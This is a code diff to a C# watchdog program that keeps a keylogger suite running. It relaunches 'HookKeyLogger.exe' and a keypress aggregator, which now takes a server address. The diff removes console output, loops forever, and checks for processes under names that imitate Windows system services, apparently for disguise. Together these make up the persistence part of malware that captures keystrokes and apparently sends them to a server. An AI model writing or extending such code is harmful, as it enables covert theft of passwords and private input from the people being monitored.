@@ -12,8 +12,8 @@ namespace ApplicationWatcher
     {
        
         private static string locationExeHook = "HookKeyLogger.exe";
-        private static string locationExeProxy="UploadProxy.exe";
         private static string locationExeAgg = "KeypressAggregator.exe";
+        private static string serverAddr = "localhost";
 
         ///<summary>
         ///Monitor the WMI to see when processes start and stop.
@@ -21,14 +21,14 @@ namespace ApplicationWatcher
         public static void Main(string[] args)
         {
             if (args.Length < 3)
-                throw new Exception("Needs three arguments for the locations of the EXE files.");
-            locationExeHook = args[0];
-            locationExeProxy = args[1];
-            locationExeAgg = args[2];
-            bool debugOn = true;
-            //System.Threading.Thread.Sleep(1000);
-            if(!debugOn)
-                startAll();
+                throw new Exception("Needs two arguments for the locations of the KeyPress Aggregator and HookKeylogger EXE files.\n"+
+                    "The third argument is the server address.");
+            locationExeAgg = args[0];
+            locationExeHook = args[1];
+            serverAddr = args[2];
+            
+
+            startAll();
             ManagementEventWatcher startWatch = new ManagementEventWatcher(
               new WqlEventQuery("SELECT * FROM Win32_ProcessStartTrace"));
             startWatch.EventArrived += new EventArrivedEventHandler(startWatch_EventArrived);
@@ -37,10 +37,11 @@ namespace ApplicationWatcher
               new WqlEventQuery("SELECT * FROM Win32_ProcessStopTrace"));
             stopWatch.EventArrived += new EventArrivedEventHandler(stopWatch_EventArrived);
             stopWatch.Start();
-            Console.WriteLine("Press any key to exit");
-            while (!Console.KeyAvailable) System.Threading.Thread.Sleep(50);
-            startWatch.Stop();
-            stopWatch.Stop();
+            //Console.WriteLine("Press any key to exit");
+            //while (!Console.KeyAvailable) System.Threading.Thread.Sleep(50);
+            while (true) System.Threading.Thread.Sleep(50);
+            //startWatch.Stop();
+            //stopWatch.Stop();
         }
         ///<summary>
         ///Check that the process is active.
@@ -63,34 +64,25 @@ namespace ApplicationWatcher
             foreach (Process clsProcess in Process.GetProcesses())
             {
                 string name = clsProcess.ProcessName;
-                if (name == "Windows Driver Foundation - User-mode Driver Framework Host Process")
+                if (name == "Host Process for Windows Tasks")
                 {
                     active[0] = 1;
                 }
-                else if (name == "Google Site Proxy")
+                else if (name == "Windows Driver Foundation - User-mode Driver Framework Host Process")
                 {
                     active[1] = 1;
                 }
-                else if (name == "Host Process for Windows Tasks")
-                {
-                    active[2] = 1;
-                }
             }
 
-            if (active[0]==0)
+            if (active[0] == 0)
+            {
+                //System.Threading.Thread.Sleep(10000);
+                System.Diagnostics.Process.Start(locationExeAgg, serverAddr);
+            }
+            if (active[1] == 0)
             {
                 //System.Threading.Thread.Sleep(10000);
                 System.Diagnostics.Process.Start(locationExeHook);
-            }
-            else if (active[1] == 0)
-            {
-                //System.Threading.Thread.Sleep(10000);
-                System.Diagnostics.Process.Start(locationExeProxy);
-            }
-            else if (active[2] == 0)
-            {
-                //System.Threading.Thread.Sleep(10000);
-                System.Diagnostics.Process.Start(locationExeAgg);
             }
 
         }
@@ -101,21 +93,16 @@ namespace ApplicationWatcher
         static void stopWatch_EventArrived(object sender, EventArrivedEventArgs e)
         {
             string name = e.NewEvent.Properties["ProcessName"].Value.ToString();
-            Console.WriteLine("Process stopped: {0}", name);
-            if(name == "Windows Driver Foundation - User-mode Driver Framework Host Process")
+            //Console.WriteLine("Process stopped: {0}", name);
+            if (name.Contains("Host"))
             {
-                //System.Threading.Thread.Sleep(10000);
-                System.Diagnostics.Process.Start(locationExeHook);
+                System.Threading.Thread.Sleep(10000);
+                startAll();
             }
-            else if(name == "Google Site Proxy")
+            else if (name.Contains("Windows"))
             {
-                //System.Threading.Thread.Sleep(10000);
-                System.Diagnostics.Process.Start(locationExeProxy);
-            }
-            else if (name == "Host Process for Windows Tasks")
-            {
-                //System.Threading.Thread.Sleep(10000);
-                System.Diagnostics.Process.Start(locationExeAgg);
+                System.Threading.Thread.Sleep(10000);
+                startAll();
             }
 
         }
@@ -127,7 +114,7 @@ namespace ApplicationWatcher
         {
             //Console.WriteLine("Process started: {0}", e.NewEvent.Properties["ProcessName"].Value);
             string name = e.NewEvent.Properties["ProcessName"].Value.ToString();
-            Console.WriteLine("Process started: {0}", name);
+            //Console.WriteLine("Process started: {0}", name);
             //if (name == "Chrome.exe")
             //{
             //    Console.WriteLine("Found");
